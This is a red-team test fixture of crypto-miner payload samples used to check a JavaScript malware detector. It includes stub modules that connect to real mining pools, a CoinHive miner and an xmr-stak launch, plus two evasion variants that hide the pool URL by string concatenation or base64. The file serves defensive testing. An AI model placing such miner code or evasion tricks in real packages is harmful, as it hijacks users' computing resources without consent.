// red-team/corpus/crypto-miner.js
// Crypto-miner attack payloads. Each entry is a JavaScript module source string
// that the harness feeds through the detector, exactly as index.js would on require().
//
// expected: 'BLOCK' -> a correct firewall stops this (QUARANTINE)
// expected: 'PASS'  -> a correct firewall lets this through (OBSERVE)
// knownBypass: true -> we EXPECT this malicious payload to slip past static analysis;
//                      it is a documented, accepted gap (needs runtime/AST analysis),
//                      not a regression. The harness logs it but does not fail on it.

module.exports = [
  {
    id: 'miner-stratum-tcp',
    category: 'crypto-miner',
    technique: 'stratum-pool-url',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'XMRig-style miner connecting to a stratum+tcp mining pool',
    code: `
      const net = require('net');
      const pool = 'stratum+tcp://pool.hashvault.pro:443';
      module.exports.start = () => net.createConnection(pool);
    `,
  },
  {
    id: 'miner-stratum-scheme',
    category: 'crypto-miner',
    technique: 'stratum-pool-url',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Miner using the stratum:// URL scheme',
    code: `
      const cfg = { url: 'stratum://xmr.pool.minergate.com:45700', user: 'wallet' };
      module.exports = cfg;
    `,
  },
  {
    id: 'miner-coinhive',
    category: 'crypto-miner',
    technique: 'browser-miner-lib',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'In-browser CoinHive/coin-hive miner reference',
    code: `
      const miner = new CoinHive.Anonymous('SITE_KEY_ABCDEF');
      miner.start();
      module.exports = miner;
    `,
  },
  {
    id: 'miner-xmr-stak',
    category: 'crypto-miner',
    technique: 'miner-binary-config',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'xmr-stak miner invocation',
    code: `
      const { execFile } = require('child_process');
      execFile('./xmr-stak', ['--currency', 'monero']);
      module.exports = {};
    `,
  },
  {
    id: 'miner-cryptonight',
    category: 'crypto-miner',
    technique: 'mining-algorithm-ref',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'cryptonight hashing algorithm reference',
    code: `
      const algo = 'cryptonight/r';
      module.exports = { hash: (buf) => require('./native').cryptonight(buf, algo) };
    `,
  },
  {
    id: 'miner-nicehash',
    category: 'crypto-miner',
    technique: 'mining-marketplace-ref',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'nicehash marketplace endpoint',
    code: `
      const endpoint = 'stratum+tcp://randomxmonero.auto.nicehash.com:9200';
      module.exports = { endpoint };
    `,
  },
  {
    id: 'miner-pool-hashvault',
    category: 'crypto-miner',
    technique: 'mining-pool-host',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'Direct reference to pool.hashvault mining host',
    code: `
      module.exports.connect = () => require('net').connect(443, 'pool.hashvault.pro');
    `,
  },

  // ── Evasion variants ────────────────────────────────────────────────────────
  {
    id: 'miner-concat-stratum',
    category: 'crypto-miner',
    technique: 'string-concat-evasion',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Pool URL reassembled from fragments to dodge the literal "stratum+tcp" signature (host is deliberately not a known-bad literal either)',
    code: `
      const scheme = 'stra' + 'tum+' + 'tcp';
      const pool = scheme + '://mine.' + 'poolhost' + '.example:443';
      module.exports.start = () => require('net').createConnection(pool);
    `,
  },
  {
    id: 'miner-base64-pool',
    category: 'crypto-miner',
    technique: 'base64-config-evasion',
    severity: 'CRITICAL',
    expected: 'BLOCK',
    knownBypass: true,
    description: 'Pool URL held as a base64 blob and decoded at runtime (never eval\'d, so OBFUSCATED_CODE_EXECUTION does not fire)',
    code: `
      const b = 'c3RyYXR1bSt0Y3A6Ly9wb29sLmhhc2h2YXVsdC5wcm86NDQz';
      const pool = Buffer.from(b, 'base64').toString();
      module.exports.start = () => require('net').createConnection(pool);
    `,
  },
];
